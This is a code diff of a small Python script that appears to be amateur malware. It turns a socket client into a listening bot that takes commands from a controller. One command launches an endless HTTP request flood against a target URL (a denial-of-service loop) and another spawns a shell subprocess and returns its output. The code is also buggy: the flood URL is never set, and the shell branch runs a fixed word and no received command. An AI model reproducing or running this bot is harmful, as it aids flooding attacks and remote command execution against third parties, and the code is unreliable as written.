@@ -1,25 +1,47 @@
-import socket, readline, os
+import socket, os, requests, subprocess
 
 ip = '10.9.1.23'
-port = 6663
+port = 6664
 
-def connection():
+def doz(url):
+	try:
+		while True:
+			r = requests.get(url)
+
+	except:
+		pass
+
+
+def c_listen():
+	
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((ip, port))
-	print('connected successfully!')
+	s.bind((ip, port))
+	s.listen(1)
+	con, adr = s.accept()
+	print(adr,' is connected!')
+	url = ''
 
 	while True:
-		cmd = input('~# ')
+		cmd = con.recv(1024).decode()
 		if cmd == 'gg':
-			s.send('gg'.encode())
-			print(s.recv(1024).decode())
-		elif s.recv(1024).decode() == 'tar':
-			ui = input('enter url: ')
-			s.send(ui.decode())
-		elif cmd == 'clear':
-			os.system('clear')
+			con.send(f'connection closed from {ip}'.encode())
+			con.close()
+			break
+		elif cmd == 'tar':
+			con.send('target loaded'.encode())
+			print(cmd)
+			con.close()
+		elif cmd == 'start':
+			doz(url)
+		elif cmd == 'shell':
+			#con.send('zhell'.encode())
+			cmd = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
+			con.send(cmd.stdout.read())
+			con.send(cmd.stderr.read())
 		else:
-			s.send(cmd.encode())
-			print(s.recv(1024).decode())
+			con.send('command not found!'.encode())
 
-connection()
+	
+
+
+c_listen()
